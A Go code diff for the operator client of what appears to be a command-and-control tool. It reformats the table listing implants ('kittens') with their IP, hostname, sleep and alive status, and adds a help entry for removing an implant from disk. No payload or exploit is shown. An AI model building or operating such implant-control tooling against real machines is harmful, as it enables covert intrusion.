@@ -121,8 +121,22 @@ func printKittens(kittens map[string]*kitten.Kitten) error {
 	}
 	fmt.Printf("%s\n\n", color.BrightGreen("[*] Kittens:"))
 
-	fmt.Printf("%s\n", color.BrightGreen("Name:\tIp:\t\tHostname:\t\tLast seen:\tSleep:\tAlive:"))
-	fmt.Printf("%s\n", color.BrightGreen("═════\t═══\t\t═════════\t\t══════════\t══════\t══════"))
+	fmt.Printf("%-5s %-15s %-20s %-12s %-8s %-8s\n",
+		color.BrightGreen("Name:"),
+		color.BrightGreen("Ip:"),
+		color.BrightGreen("Hostname:"),
+		color.BrightGreen("Last seen:"),
+		color.BrightGreen("Sleep:"),
+		color.BrightGreen("Alive:"),
+	)
+	fmt.Printf("%-5s %-15s %-20s %-12s %-8s %-8s\n",
+		color.BrightGreen("═════"),
+		color.BrightGreen("═══"),
+		color.BrightGreen("═════════"),
+		color.BrightGreen("══════════"),
+		color.BrightGreen("══════"),
+		color.BrightGreen("══════"),
+	)
 
 	for name, k := range kittens {
 		var e string
@@ -130,7 +144,7 @@ func printKittens(kittens map[string]*kitten.Kitten) error {
 			r := k.GetRecon()
 			if k.GetAlive() {
 				e = "Yes"
-				fmt.Printf("%s\t%s\t%s\t\t%s\t%d\t%s\n",
+				fmt.Printf("%-5s %-15s %-20s %-12s %-8d %-8s\n",
 					color.BrightWhite(name),
 					color.BrightWhite(r.GetIp()),
 					color.BrightWhite(r.GetHostname()),
@@ -138,17 +152,18 @@ func printKittens(kittens map[string]*kitten.Kitten) error {
 					color.BrightWhite(k.GetSleep()),
 					color.BrightWhite(e),
 				)
-
 			} else {
 				e = "No 💀"
-				fmt.Printf("%s\t%s\t%s\t\t%s\t%d\t%s\n",
+				fmt.Printf("%-5s %-15s %-20s %-12s %-8d %-8s\n",
 					color.BrightRed(name),
 					color.BrightRed(r.GetIp()),
 					color.BrightRed(r.GetHostname()),
 					color.BrightRed(k.GetLastSeen().Format("15:04:05")),
 					color.BrightRed(k.GetSleep()),
-					color.BrightRed(e))
+					color.BrightRed(e),
+				)
 			}
+
 		}
 	}
 
@@ -250,6 +265,7 @@ func printHelpInt() {
 		"priv\t\tGet privileges and integrity level\n"+
 		"info\t\tShow all the kitten info\n"+
 		"kill\t\tKill the kitten :(\n"+
+		"remove\t\tRemove the kitten from disk and exit\n"+
 		"exit\t\tExit the client"))
 }
 
